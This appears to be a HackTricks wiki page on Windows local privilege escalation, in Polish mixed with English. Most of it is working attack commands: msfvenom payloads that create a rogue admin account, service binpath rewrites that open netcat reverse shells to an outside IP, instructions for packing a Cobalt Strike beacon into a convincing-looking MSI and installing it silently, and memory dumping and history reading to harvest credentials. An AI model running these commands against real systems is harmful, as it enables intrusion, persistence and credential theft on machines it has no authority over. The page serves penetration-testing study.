# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Podstawy Windows

### Access Tokens

**Jeśli nie wiesz, czym są Windows Access Tokens, przeczytaj poniższą stronę przed kontynuowaniem:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Sprawdź poniższą stronę, aby uzyskać więcej informacji o ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Jeśli nie wiesz, czym są integrity levels w Windows, powinieneś przeczytać poniższą stronę przed kontynuacją:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Kontrole bezpieczeństwa Windows

Są różne elementy w Windows, które mogą **uniemożliwić ci enumerację systemu**, uruchamianie programów wykonywalnych lub nawet **wykryć twoje działania**. Powinieneś **przeczytać** poniższą **stronę** i **wypisać** wszystkie te **mechanizmy obronne** przed rozpoczęciem privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Informacje o systemie

### Enumeracja informacji o wersji

Sprawdź, czy wersja Windows ma jakąś znaną podatność (sprawdź także zastosowane poprawki).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploits według wersji

Ta [site](https://msrc.microsoft.com/update-guide/vulnerability) jest przydatna do wyszukiwania szczegółowych informacji o Microsoft security vulnerabilities. Ta baza zawiera ponad 4 700 security vulnerabilities, pokazując **ogromną powierzchnię ataku**, jaką prezentuje środowisko Windows.

**Na systemie**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ma wbudowanego watsona)_

**Lokalnie z informacjami o systemie**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repozytoria Github z exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Środowisko

Czy jakiekolwiek credential/Juicy info jest zapisane w env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historia PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Pliki transkrypcji PowerShell

Możesz dowiedzieć się, jak to włączyć na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Szczegóły wykonywania pipeline PowerShell są rejestrowane, obejmując wykonywane polecenia, wywołania poleceń oraz fragmenty skryptów. Jednak pełne szczegóły wykonania i wyniki mogą nie być zarejestrowane.

Aby to włączyć, wykonaj instrukcje w sekcji "Transcript files" dokumentacji, wybierając **"Module Logging"** zamiast **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Aby wyświetlić ostatnie 15 zdarzeń z logów PowersShell, możesz wykonać:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Pełny zapis aktywności i zawartości wykonywanego skryptu jest rejestrowany, co zapewnia, że każdy blok kodu jest dokumentowany w trakcie działania. Proces ten zachowuje kompleksowy ślad audytu każdej aktywności, przydatny dla celów informatyki śledczej i analizy złośliwych zachowań. Dokumentując całą aktywność w czasie wykonywania, uzyskuje się szczegółowy wgląd w proces.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Zdarzenia logowania dla Script Block można znaleźć w Windows Event Viewer pod ścieżką: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Aby zobaczyć ostatnie 20 zdarzeń, możesz użyć:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Ustawienia Internetu
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Dyski
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Możesz przejąć system, jeśli aktualizacje nie są żądane przy użyciu http**S**, lecz http.

Zacznij od sprawdzenia, czy sieć używa aktualizacji WSUS bez SSL, uruchamiając w cmd następujące polecenie:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Lub następujące w PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Jeśli otrzymasz odpowiedź taką jak jedna z poniższych:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

Aby wykorzystać te podatności możesz użyć narzędzi takich jak: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Są to MiTM weaponized exploits scripts służące do wstrzykiwania 'fałszywych' aktualizacji w ruch WSUS bez SSL.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Ogólnie rzecz biorąc, to jest luka, którą ten błąd wykorzystuje:

> Jeśli mamy możliwość zmodyfikowania lokalnego proxy użytkownika, a Windows Updates używa proxy skonfigurowanego w ustawieniach Internet Explorer, to mamy możliwość uruchomienia lokalnie [PyWSUS], aby przechwycić własny ruch i uruchomić kod jako użytkownik z podwyższonymi uprawnieniami na naszym zasobie.
>
> Ponadto, ponieważ usługa WSUS używa ustawień bieżącego użytkownika, będzie również korzystać z jego magazynu certyfikatów. Jeśli wygenerujemy certyfikat samopodpisany dla nazwy hosta WSUS i dodamy ten certyfikat do magazynu certyfikatów bieżącego użytkownika, będziemy w stanie przechwycić zarówno HTTP, jak i HTTPS ruch WSUS. WSUS nie używa mechanizmów podobnych do HSTS, aby zaimplementować walidację typu trust-on-first-use certyfikatu. Jeśli przedstawiony certyfikat jest zaufany przez użytkownika i ma poprawną nazwę hosta, zostanie zaakceptowany przez usługę.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Wiele enterprise agentów udostępnia lokalny interfejs IPC na localhost oraz uprzywilejowany kanał aktualizacji. Jeśli enrollment można wymusić na serwer atakującego i updater ufa rogue root CA lub ma słabe sprawdzenia podpisu, lokalny użytkownik może dostarczyć złośliwy MSI, który usługa SYSTEM zainstaluje. Zobacz uogólnioną technikę (opartą na łańcuchu Netskope stAgentSvc – CVE-2025-0309) tutaj:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

A local privilege escalation vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Jeśli masz sesję meterpreter możesz zautomatyzować tę technikę za pomocą modułu **`exploit/windows/local/always_install_elevated`**

### PowerUP

Użyj polecenia `Write-UserAddMSI` z power-up, aby utworzyć w bieżącym katalogu plik MSI dla Windows służący do eskalacji uprawnień. Ten skrypt zapisuje wstępnie skompilowany instalator MSI, który wyświetla monit o dodanie użytkownika/grupy (więc będziesz potrzebować GIU access):
```
Write-UserAddMSI
```
Po prostu uruchom utworzony binary, aby uzyskać podniesienie uprawnień.

### MSI Wrapper

Przeczytaj ten poradnik, aby dowiedzieć się, jak utworzyć MSI wrapper używając tych narzędzi. Zauważ, że możesz opakować plik "**.bat**", jeśli **tylko** chcesz **wykonywać** **polecenia**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Wygeneruj** za pomocą Cobalt Strike lub Metasploit nowy **Windows EXE TCP payload** w `C:\privesc\beacon.exe`
- Otwórz **Visual Studio**, wybierz **Create a new project** i wpisz "installer" w polu wyszukiwania. Wybierz projekt **Setup Wizard** i kliknij **Next**.
- Nadaj projektowi nazwę, np. **AlwaysPrivesc**, użyj **`C:\privesc`** jako lokalizacji, zaznacz **place solution and project in the same directory**, i kliknij **Create**.
- Klikaj **Next** aż dojdziesz do kroku 3 z 4 (choose files to include). Kliknij **Add** i wybierz wygenerowany Beacon payload. Następnie kliknij **Finish**.
- Zaznacz projekt **AlwaysPrivesc** w **Solution Explorer**, a w **Properties** zmień **TargetPlatform** z **x86** na **x64**.
- Są inne właściwości, które możesz zmienić, takie jak **Author** i **Manufacturer**, co może sprawić, że zainstalowana aplikacja będzie wyglądać bardziej wiarygodnie.
- Kliknij prawym przyciskiem projekt i wybierz **View > Custom Actions**.
- Kliknij prawym przyciskiem **Install** i wybierz **Add Custom Action**.
- Kliknij dwukrotnie **Application Folder**, wybierz swój plik **beacon.exe** i kliknij **OK**. Dzięki temu beacon payload zostanie uruchomiony zaraz po uruchomieniu instalatora.
- W **Custom Action Properties** zmień **Run64Bit** na **True**.
- Na koniec **zbuduj projekt**.
- Jeśli pojawi się ostrzeżenie `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, upewnij się, że ustawiłeś platformę na x64.

### MSI Installation

Aby wykonać **instalację** złośliwego `.msi` w **tle:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Aby wykorzystać tę podatność możesz użyć: _exploit/windows/local/always_install_elevated_

## Antywirusy i detektory

### Ustawienia audytu

Te ustawienia decydują o tym, co jest **logowane**, więc należy zwrócić na nie uwagę
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding — warto wiedzieć, dokąd wysyłane są logi
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** został zaprojektowany do zarządzania lokalnymi hasłami konta Administrator, zapewniając, że każde hasło jest unikalne, losowe i regularnie aktualizowane na komputerach dołączonych do domeny. Hasła te są bezpiecznie przechowywane w Active Directory i dostęp do nich mają tylko użytkownicy, którym przyznano odpowiednie uprawnienia poprzez ACLs, co pozwala im przeglądać lokalne hasła administratora, jeśli są uprawnieni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Jeśli jest aktywny, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**Więcej informacji o WDigest na tej stronie**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Począwszy od **Windows 8.1**, Microsoft wprowadził rozszerzoną ochronę dla Local Security Authority (LSA), aby **blokować** próby nieufnych procesów polegające na **odczytaniu jego pamięci** lub wstrzyknięciu kodu, dodatkowo zabezpieczając system.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** został wprowadzony w **Windows 10**. Jego celem jest zabezpieczenie credentials przechowywanych na urządzeniu przed zagrożeniami takimi jak ataki pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** są uwierzytelniane przez **Local Security Authority** (LSA) i wykorzystywane przez komponenty systemu operacyjnego. Gdy dane logowania użytkownika zostaną uwierzytelnione przez zarejestrowany security package, domain credentials dla tego użytkownika są zazwyczaj ustanawiane.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Użytkownicy i grupy

### Enumeracja użytkowników i grup

Należy sprawdzić, czy którakolwiek z grup, do których należysz, ma interesujące uprawnienia.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Grupy uprzywilejowane

Jeśli **należysz do jakiejś grupy uprzywilejowanej, możesz mieć możliwość eskalacji uprawnień**. Dowiedz się o grupach uprzywilejowanych i jak je nadużyć, aby eskalować uprawnienia tutaj:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Dowiedz się więcej** o tym, czym jest **token** na tej stronie: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Sprawdź następującą stronę, aby **dowiedzieć się o interesujących tokens** i jak je nadużyć:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Zalogowani użytkownicy / Sesje
```bash
qwinsta
klist sessions
```
### Katalogi domowe
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Polityka haseł
```bash
net accounts
```
### Pobierz zawartość schowka
```bash
powershell -command "Get-Clipboard"
```
## Uruchomione procesy

### Uprawnienia plików i folderów

Przede wszystkim, listując procesy, sprawdź, czy w command line procesu nie ma haseł.\
Sprawdź, czy możesz **overwrite some binary running** lub czy masz uprawnienia zapisu do folderu z binariami, aby wykorzystać możliwe [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Zawsze sprawdzaj możliwe [**electron/cef/chromium debuggers** uruchomione, możesz to wykorzystać do eskalacji uprawnień](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Sprawdzanie uprawnień plików binarnych procesów**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Sprawdzanie uprawnień folderów binarek procesów (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Możesz utworzyć zrzut pamięci działającego procesu za pomocą **procdump** ze sysinternals. Usługi takie jak FTP przechowują **credentials in clear text in memory** — spróbuj zrzucić pamięć i odczytać credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Niezabezpieczone aplikacje GUI

**Aplikacje uruchomione jako SYSTEM mogą pozwolić użytkownikowi uruchomić CMD lub przeglądać katalogi.**

Przykład: "Windows Help and Support" (Windows + F1), wyszukaj "command prompt", kliknij "Click to open Command Prompt"

## Usługi

Service Triggers pozwalają Windows uruchomić usługę, gdy wystąpią określone warunki (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Nawet bez uprawnień SERVICE_START często możesz uruchomić uprzywilejowane usługi, wywołując ich triggers. Zobacz techniki enumeracji i aktywacji tutaj:

-
{{#ref}}
service-triggers.md
{{#endref}}

Pobierz listę usług:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Uprawnienia

Możesz użyć **sc**, aby uzyskać informacje o usłudze
```bash
sc qc <service_name>
```
Zaleca się mieć binarkę **accesschk** z _Sysinternals_, aby sprawdzić wymagany poziom uprawnień dla każdej usługi.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Zaleca się sprawdzić, czy "Authenticated Users" mogą modyfikować jakąkolwiek usługę:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Włącz usługę

Jeżeli pojawia się ten błąd (na przykład z SSDPSRV):

_Wystąpił błąd systemowy 1058._\
_Usługi nie można uruchomić, ponieważ jest wyłączona lub nie ma z nią powiązanych włączonych urządzeń._

Możesz ją włączyć, używając
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Weź pod uwagę, że usługa upnphost zależy od SSDPSRV, aby działać (dla XP SP1)**

**Innym obejściem tego problemu jest uruchomienie:**
```
sc.exe config usosvc start= auto
```
### **Modyfikacja ścieżki pliku binarnego usługi**

W scenariuszu, w którym grupa "Authenticated users" posiada **SERVICE_ALL_ACCESS** na usłudze, możliwa jest modyfikacja pliku wykonywalnego usługi. Aby zmodyfikować i uruchomić **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Ponowne uruchomienie usługi
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Uprawnienia można eskalować poprzez różne prawa:

- **SERVICE_CHANGE_CONFIG**: Pozwala na rekonfigurację pliku binarnego usługi.
- **WRITE_DAC**: Umożliwia zmianę uprawnień, co prowadzi do możliwości zmiany konfiguracji usługi.
- **WRITE_OWNER**: Pozwala na przejęcie własności i zmianę uprawnień.
- **GENERIC_WRITE**: Dziedziczy możliwość zmiany konfiguracji usługi.
- **GENERIC_ALL**: Również dziedziczy możliwość zmiany konfiguracji usługi.

Do wykrywania i wykorzystania tej luki można użyć _exploit/windows/local/service_permissions_.

### Services binaries weak permissions

**Sprawdź, czy możesz zmodyfikować binarkę, która jest uruchamiana przez usługę** lub czy masz **write permissions on the folder** gdzie znajduje się binarka ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Możesz uzyskać każdą binarkę uruchamianą przez usługę używając **wmic** (nie w system32) i sprawdzić swoje uprawnienia za pomocą **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Możesz także użyć **sc** i **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Modyfikacja uprawnień rejestru usług

Powinieneś sprawdzić, czy możesz zmodyfikować jakikolwiek rejestr usług.\
Możesz **sprawdzić** swoje **uprawnienia** względem rejestru **usług** wykonując:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Należy sprawdzić, czy **Authenticated Users** lub **NT AUTHORITY\INTERACTIVE** posiadają uprawnienia `FullControl`. Jeśli tak, plik wykonywalny uruchamiany przez usługę można zmodyfikować.

Aby zmienić ścieżkę pliku wykonywalnego uruchamianego:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Rejestr usług — uprawnienia AppendData/AddSubdirectory

Jeśli masz to uprawnienie do rejestru, oznacza to, że **możesz tworzyć podrejestry w tym rejestrze**. W przypadku usług Windows jest to **wystarczające, aby wykonać dowolny kod:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Jeśli ścieżka do pliku wykonywalnego nie jest ujęta w cudzysłowy, Windows będzie próbował uruchomić każdy fragment ścieżki kończący się przed spacją.

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Wymień wszystkie nieotoczone cudzysłowami ścieżki usług, z wyłączeniem tych należących do wbudowanych usług Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Możesz wykryć i przeprowadzić exploit** tej podatności za pomocą metasploit: `exploit/windows/local/trusted\_service\_path` Możesz ręcznie utworzyć plik binarny usługi za pomocą metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Działania odzyskiwania

Windows pozwala użytkownikom określić akcje do wykonania, jeśli usługa ulegnie awarii. Funkcję tę można skonfigurować tak, aby wskazywała na binary. Jeśli ten binary jest podmienialny, możliwa jest privilege escalation. Więcej szczegółów znajdziesz w [oficjalnej dokumentacji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Aplikacje

### Zainstalowane aplikacje

Sprawdź **permissions of the binaries** (może uda ci się overwrite one i escalate privileges) oraz **foldery** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Write Permissions

Sprawdź, czy możesz zmodyfikować jakiś config file, aby odczytać jakiś specjalny plik lub czy możesz zmodyfikować jakiś binary, który zostanie uruchomiony przez konto Administrator (schedtasks).

Jednym ze sposobów na znalezienie słabych uprawnień do folderów/plików w systemie jest wykonanie:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Uruchamianie przy starcie

**Sprawdź, czy możesz nadpisać jakiś wpis w rejestrze lub binarkę, która zostanie uruchomiona przez innego użytkownika.**\
**Przeczytaj** **następującą stronę** aby dowiedzieć się więcej o interesujących **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sterowniki

Szukaj możliwych **third party weird/vulnerable** sterowników
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
